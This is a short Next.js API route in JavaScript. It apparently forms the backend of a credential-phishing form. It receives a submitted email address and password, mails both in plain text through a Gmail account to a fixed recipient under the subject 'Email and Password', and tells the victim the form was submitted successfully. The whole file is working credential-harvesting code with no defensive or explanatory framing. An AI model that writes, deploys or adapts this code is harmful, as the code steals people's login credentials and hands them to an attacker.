import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request) {
    try {
        const body = await request.json();
        const { email, password } = body;

        // debugging stuff
        // console.log('Environment variables check:', {
        //     hasEmailUser: !!process.env.EMAIL_USER,
        //     hasEmailPass: !!process.env.EMAIL_PASSWORD,
        //     hasRecipientEmail: !!process.env.RECIPIENT_EMAIL
        // });

        if (!process.env.EMAIL_USER || !process.env.EMAIL_PASSWORD || !process.env.RECIPIENT_EMAIL) {
            throw new Error('Missing email configuration');
        }

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASSWORD
            }
        });

        // thing that is being emailed
        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: process.env.RECIPIENT_EMAIL,
            subject: 'Email and Password',
            html: `
                <h2>deets</h2>
                <p><strong>Email:</strong> ${email}</p>
                <p><strong>Password:</strong> ${password}</p>
            `
        };

        // send email !!!!!!
        await transporter.sendMail(mailOptions);

        return NextResponse.json({ message: 'Form submitted successfully' }, { status: 200 });
    } catch (error) {
        console.error('Submission error:', error);
        return NextResponse.json(
            { message: `Error submitting form: ${error.message}` },
            { status: 500 }
        );
    }
}